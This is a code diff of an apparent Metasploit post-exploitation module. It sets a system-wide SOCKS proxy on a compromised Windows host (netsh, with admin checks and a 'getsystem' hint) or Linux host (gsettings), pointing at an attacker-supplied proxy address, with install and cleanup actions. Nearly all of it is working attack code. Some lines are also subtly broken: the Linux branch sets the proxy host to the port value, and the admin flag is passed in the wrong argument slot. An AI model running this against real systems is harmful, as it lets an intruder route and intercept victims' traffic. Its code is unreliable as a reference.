@@ -4,7 +4,7 @@
 ##
 
 class MetasploitModule < Msf::Post
-  include Msf::Post::File
+  include Msf::Post::Linux::System
   include Msf::Post::Windows::Priv
 
   def initialize(info={})
@@ -15,44 +15,103 @@ class MetasploitModule < Msf::Post
       },
       'License'       => MSF_LICENSE,
       'Author'        => [ 'Eliott Teissonniere' ],
-      'Platform'      => [ 'win', 'linux' ],
-      'SessionTypes'  => [ 'meterpreter', 'shell' ]
+      'Platform'      => [ 'win', 'linux', 'unix' ],
+      'SessionTypes'  => [ 'meterpreter', 'shell' ],
+      'DefaultAction' => 'INSTALL',
+      'Actions'       =>
+        [
+          [ 'INSTALL', { 'Description' => 'Install the proxy' } ],
+          [ 'CLEANUP', { 'Description' => 'Remove the proxy' } ]
+        ]
     ))
 
     register_options(
       [
         OptAddress.new('PRXHOST', [true, 'Address of the proxy server']),
-        OptPort.new('PRXPORT', [true, 'Port of the proxy server']),
-        OptBool.new('CLEANUP', [false, 'If we should remove the proxy instead of installing it'])
+        OptPort.new('PRXPORT', [true, 'Port of the proxy server'])
       ])
   end
 
-  def run
-    if session.platform == 'windows'
-      print_status('Windows detected, using netsh')
+  # Custom cmd_exec for tweaking purposes
+  def vcmd_exec(cmd, check='', admin=false)
+    if check != '' # For Linux / Unix
+      vprint_status "Checking if #{check} is available"
 
-      unless datastore['CLEANUP']
-        vprint_status cmd_exec("netsh winhttp set proxy proxy-server=\"socks=#{datastore["RHOST"]}:#{datastore["RPORT"]}\" bypass-list=\"<local>\"")
+      unless command_exists? check
+        return print_error("#{check} is not available")
       else
-        vprint_status cmd_exec('netsh winhttp reset proxy')
+        print_good("#{check} is available")
       end
-    elsif session.platform == 'linux'
-      unless command_exists? 'gsettings'
-        return print_error('Gsettings is not available')
-      end
-
-      print_good('Gsettings available')
-
-      unless datastore['CLEANUP']
-        vprint_status cmd_exec("gsettings set org.gnome.system.proxy mode 'manual'") # tell NetworkManager there is a proxy
-        vprint_status cmd_exec("gsettings set org.gnome.system.proxy.socks port #{datastore["RPORT"]}")
-        vprint_status cmd_exec("gsettings set org.gnome.system.proxy.socks host #{datastore["RHOST"]}")
-        vprint_status cmd_exec("gsettings set org.gnome.system.proxy ignore-hosts \"['localhost', '127.0.0.0/8', '::1']\"")
-      else
-        vprint_status cmd_exec('gsettings set org.gnome.system.proxy.mode "none"')
-      end
-    else
-      print_error('Unsupported platform')
     end
+
+    if admin # For Windows
+      unless is_admin?
+        return print_error('Administrator or better privileges needed. Try "getsystem" first.')
+      else
+        print_good('Administrator or better privileges detected')
+      end
+    end
+
+    vprint_status "Executing #{cmd}"
+    out = cmd_exec(cmd)
+    vprint_status out
+
+    return out
+  end
+
+  def win_install
+    vcmd_exec("netsh winhttp set proxy proxy-server=\"socks=#{datastore["PRXHOST"]}:#{datastore["PRXPORT"]}\" bypass-list=\"<local>\"", admin=true)
+  end
+
+  def win_clean
+    vcmd_exec('netsh winhttp reset proxy', admin=true)
+  end
+
+  def linux_install
+    vcmd_exec("gsettings set org.gnome.system.proxy mode 'manual'", 'gsettings') # tell NetworkManager there is a proxy
+    vcmd_exec("gsettings set org.gnome.system.proxy.socks port #{datastore["PRXPORT"]}", 'gsettings')
+    vcmd_exec("gsettings set org.gnome.system.proxy.socks host #{datastore["PRXPORT"]}", 'gsettings')
+    vcmd_exec("gsettings set org.gnome.system.proxy ignore-hosts \"['localhost', '127.0.0.0/8', '::1']\"")
+  end
+
+  def linux_clean
+    vcmd_exec('gsettings set org.gnome.system.proxy mode "none"', 'gsettings')
+  end
+
+  def install_proxy
+    print_status('Installing new proxy')
+
+    case session.platform
+      when 'windows'
+        return win_install
+      when 'linux', 'unix'
+        return linux_install
+    end
+
+    return print_error('Unsupported platform')
+  end
+
+  def cleanup_proxy
+    print_status('Cleaning up proxy settings')
+
+    case session.platform
+      when 'windows'
+        return win_clean
+      when 'linux', 'unix'
+        return linux_clean
+    end
+
+    return print_error('Unsupported platform')
+  end
+
+  def run
+    case action.name
+      when 'INSTALL'
+        return install_proxy
+      when 'CLEANUP'
+        return cleanup_proxy
+    end
+
+    print_error('Please specify a valid action')
   end
 end
